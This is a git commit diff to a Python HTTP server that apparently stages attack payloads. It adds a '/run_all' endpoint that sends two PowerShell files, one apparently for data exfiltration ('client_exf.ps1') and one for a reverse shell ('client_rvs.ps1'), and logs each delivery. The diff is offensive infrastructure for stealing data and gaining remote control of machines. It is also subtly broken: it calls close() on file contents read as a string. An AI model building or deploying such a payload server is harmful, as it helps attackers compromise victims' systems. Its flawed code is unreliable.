4ee503fde999dadccaa109c4837a9388e14c49a4
afkfr0mkeyb0ard <123593001+afkfr0mkeyb0ard@users.noreply.github.com>
2024-06-30 00:36:26 +0200

    Update server.py

--- server.py
+++ server.py
@@ -17,7 +17,24 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         headers = self.headers
-        if self.path == '/client_exf.ps1':
+        if self.path == '/run_all':
+            try:
+                file_to_open = open('client_exf.ps1','r').read()
+                self.send_response(200)
+                self.send_header('Content-type', 'text')
+                self.end_headers()
+                self.wfile.write(bytes(file_to_open, 'utf-8'))
+                log('[+] File client_exf.ps1 has been requested and was sent!',print_console=True,trace_time=True)
+                file_to_open.close()
+                file_to_open = open('client_rvs.ps1','r').read()
+                self.wfile.write(bytes(file_to_open, 'utf-8'))
+                log('[+] File client_rvs.ps1 has been requested and was sent!',print_console=True,trace_time=True)
+                file_to_open.close()
+            except:
+                log('[-] Error while sending both files.',print_console=True,trace_time=True)
+                self.send_response(404)
+                self.wfile.write(b'Not Found')
+        elif self.path == '/client_exf.ps1':
             try:
                 file_to_open = open('client_exf.ps1','r').read()
                 self.send_response(200)
